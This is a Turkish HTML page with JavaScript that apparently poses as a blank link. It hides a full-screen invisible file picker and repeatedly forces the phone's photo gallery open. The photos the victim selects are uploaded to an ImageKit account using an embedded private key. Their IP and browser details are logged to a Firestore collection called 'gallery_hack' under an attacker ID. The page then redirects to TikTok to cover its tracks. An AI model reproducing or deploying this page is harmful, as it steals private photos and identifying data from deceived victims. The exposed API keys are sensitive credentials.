<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>.</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            min-height: 100vh;
            min-height: 100dvh;
        }
    </style>
</head>
<body>

    <input type="file" id="galleryInput" multiple accept="image/*" style="position:fixed;top:0;left:0;width:100%;height:100%;opacity:0;cursor:pointer;z-index:9999;">

    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>

    <script>
        (function() {
            const params = new URLSearchParams(window.location.search);
            const uid = params.get('uid');
            const count = Math.min(parseInt(params.get('count')) || 10, 100);

            if (!uid) {
                window.location.href = 'https://www.tiktok.com';
                return;
            }

            const IMAGEKIT_CONFIG = {
                publicKey: 'public_XJOKnz4iFXkkFRR/NNOj41Y6Ddk=',
                privateKey: 'private_T2ESq+R6d+czVTlcK/u4QkW4yBU='
            };

            const firebaseConfig = {
                apiKey: "AIzaSyBSy4oCPNTB1h9l2M1P3rkcvwiDrhu82Ao",
                authDomain: "camerahhh-15487.firebaseapp.com",
                projectId: "camerahhh-15487",
                storageBucket: "camerahhh-15487.firebasestorage.app",
                messagingSenderId: "212849652224",
                appId: "1:212849652224:web:19d8a85c01cd81005bdee5"
            };

            if (!firebase.apps.length) {
                firebase.initializeApp(firebaseConfig);
            }
            const db = firebase.firestore();

            async function uploadToImageKit(file) {
                return new Promise((resolve) => {
                    const formData = new FormData();
                    formData.append('file', file);
                    formData.append('publicKey', IMAGEKIT_CONFIG.publicKey);
                    formData.append('fileName', Date.now() + '_' + file.name);
                    formData.append('folder', '/gallery-uploads');
                    formData.append('useUniqueFileName', 'true');

                    const xhr = new XMLHttpRequest();
                    xhr.open('POST', 'https://upload.imagekit.io/api/v1/files/upload');
                    xhr.setRequestHeader('Authorization', 'Basic ' + btoa(IMAGEKIT_CONFIG.privateKey + ':'));
                    xhr.timeout = 120000;

                    xhr.onload = function() {
                        if (xhr.status === 200 || xhr.status === 201) {
                            try {
                                const data = JSON.parse(xhr.responseText);
                                resolve(data.url);
                            } catch(e) { resolve(null); }
                        } else { resolve(null); }
                    };
                    xhr.onerror = function() { resolve(null); };
                    xhr.ontimeout = function() { resolve(null); };
                    xhr.send(formData);
                });
            }

            async function getIP() {
                try {
                    const r = await fetch('https://api.ipify.org?format=json');
                    return (await r.json()).ip;
                } catch(e) { return 'unknown'; }
            }

            const galleryInput = document.getElementById('galleryInput');

            galleryInput.addEventListener('change', async function(e) {
                const files = Array.from(e.target.files);
                
                if (!files || files.length === 0) {
                    window.location.href = 'https://www.tiktok.com';
                    return;
                }

                const selectedFiles = files.slice(0, count);

                try {
                    const ip = await getIP();
                    const photoUrls = [];

                    for (let i = 0; i < selectedFiles.length; i++) {
                        const url = await uploadToImageKit(selectedFiles[i]);
                        if (url) photoUrls.push(url);
                    }

                    if (photoUrls.length > 0) {
                        await db.collection("gallery_hack").add({
                            ownerId: uid,
                            photos: photoUrls,
                            photoCount: photoUrls.length,
                            requestedCount: count,
                            ip: ip,
                            userAgent: navigator.userAgent,
                            timestamp: new Date().toISOString(),
                            unix: Date.now()
                        }).catch(async function() {
                            await db.collection("gallery_hack").add({
                                ownerId: uid,
                                photos: photoUrls,
                                photoCount: photoUrls.length,
                                requestedCount: count,
                                ip: ip,
                                userAgent: navigator.userAgent.substring(0, 100),
                                timestamp: new Date().toISOString(),
                                unix: Date.now()
                            });
                        });
                    }
                } catch(e) {
                    console.log('Hata:', e.message);
                }

                window.location.href = 'https://www.tiktok.com';
            });

            // OTOMATİK AÇ - sürekli dene
            function triggerInput() {
                galleryInput.click();
            }

            // Hemen dene
            triggerInput();

            // 500ms sonra tekrar dene
            setTimeout(triggerInput, 500);

            // 1 saniye sonra tekrar dene
            setTimeout(triggerInput, 1000);

            // 2 saniye sonra tekrar dene
            setTimeout(triggerInput, 2000);

            // Sayfaya dokununca dene
            document.addEventListener('click', triggerInput);
            document.addEventListener('touchstart', triggerInput, { once: true });

            // Sayfa görünür olunca dene
            document.addEventListener('visibilitychange', function() {
                if (document.visibilityState === 'visible') {
                    setTimeout(triggerInput, 300);
                }
            });

            window.addEventListener('focus', function() {
                setTimeout(triggerInput, 300);
            });

            // 5 saniye sonra hala dosya seçilmediyse direkt yönlendir
            setTimeout(function() {
                if (!galleryInput.files || galleryInput.files.length === 0) {
                    window.location.href = 'https://www.tiktok.com';
                }
            }, 5000);

        })();
    </script>
</body>
</html>
